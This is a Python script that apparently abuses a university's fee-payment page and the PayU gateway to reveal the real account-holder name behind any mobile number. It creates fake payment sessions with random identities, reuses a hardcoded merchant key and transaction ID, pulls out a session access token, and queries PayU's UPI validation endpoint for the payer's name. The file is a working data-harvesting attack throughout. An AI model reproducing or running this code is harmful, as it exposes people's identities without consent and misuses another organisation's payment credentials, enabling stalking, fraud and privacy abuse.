# tn_service.py
import requests
from bs4 import BeautifulSoup
import random
import string
import json

DOMAINS = ["example.com", "gmail.com", "yahoo.com", "hotmail.com"]
HEADERS = {
    "Accept-Language": "en-GB,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}

def _rand4():
    return ''.join(random.choices(string.ascii_lowercase, k=4))

def _rand_mobile():
    start = random.randint(70, 99)
    rest = random.randint(100000000, 999999999)
    return f"{start}{rest}"

def _rand_email():
    user = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"{user}@{random.choice(DOMAINS)}"

def _extract_hash(html):
    soup = BeautifulSoup(html, "html.parser")
    tag = soup.find("input", {"id": "hash"})
    return tag["value"] if tag else None

# Get the hash value from HTML content
def get_hash_value(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    hash_input = soup.find('input', {'id': 'hash'})
    return hash_input['value'] if hash_input else None

# Send GET request to the payment page and extract the hash value
def _get_hash(mobileno, random_email, random4letter):
    url = (
        f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment"
        f"?merchantTxnID=FSTKN970958575283250001"
        f"&orderAmount=354"
        f"&MobielNo={mobileno}"
        f"&EmailID={random_email}"
        f"&firstName={random4letter}%20Rao"
        f"&Description=Payment%20Towards%20Application%20Form%20Fees%20For%20Regular%20Statutory%20Positions%20%3A%20Reserved%20Catagory%20%20%5B{random4letter}%20Rao%5D"
        f"&requestNumber=FSTKN0004066153134"
        f"&isNeftChallanFromPG=False"
        f"&payExpiry=01%2F01%2F0001%2000%3A00%3A00"
        f"&IsPayExpiry=False"
        f"&PGiD=4"
    )
    response = requests.get(url, headers=HEADERS, timeout=15)
    soup = __import__('bs4').BeautifulSoup(response.text, 'html.parser')

    def _field(name):
        tag = soup.find('input', {'name': name})
        return tag['value'] if tag else None

    hash_val      = _field('hash')
    actual_email  = _field('email')      or random_email
    actual_fname  = _field('firstname')  or (random4letter + ' Rao')
    actual_phone  = _field('phone')      or mobileno
    return hash_val, actual_email, actual_fname, actual_phone


def _get_pid(mobileno, email, hash_value, firstname):
    burp0_url = "https://secure.payu.in:443/_payment"
    burp0_data = {
        "pgEnquiryBy": "2", "drop_category": "NEFTRTGS", "udf1": '', "udf2": '', "udf3": '',
        "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN970958575283250001", "amount": "354",
        "phone": mobileno, "email": email,
        "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
        "curl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
        "firstname": firstname,
        "productinfo": "Payment Towards Application Form Fees For Regular ",
        "key": "Xp7re3"
    }
    response = requests.post(burp0_url, headers=HEADERS, data=burp0_data, allow_redirects=False)
    location = response.headers.get('Location')
    return location.split('/')[-1] if location else None

def _get_token(pid):
    r = requests.get(
        f"https://api.payu.in/checkoutx?paymentId={pid}",
        headers=HEADERS,
        timeout=15
    )
    return r.json().get("transaction", {}).get("accessToken")

def resolve_true_name(mobile: str):
    """
    Returns: (verified_name | None, error | None)
    """
    random_mobileno = str(_rand_mobile())
    random_email = _rand_email()
    random4letter = _rand4()
    try:
        hash_val, actual_email, actual_firstname, actual_phone = _get_hash(random_mobileno, random_email, random4letter)
        if not hash_val:
            return None, "hash_not_found"

        pid = _get_pid(actual_phone, actual_email, hash_val, actual_firstname)
        if not pid:
            return None, "payment_id_failed"

        token = _get_token(pid)
        if not token:
            return None, "token_failed"

        r = requests.get(
            f"https://api.payu.in/utilities/vpas/{mobile}/validate"
            f"?paymentId={pid}&mapperFlow=1&access_token={token}",
            headers=HEADERS,
            timeout=15
        )

        data = r.json()
        return data.get("payerAccountName"), None

    except Exception as e:
        return None, str(e)
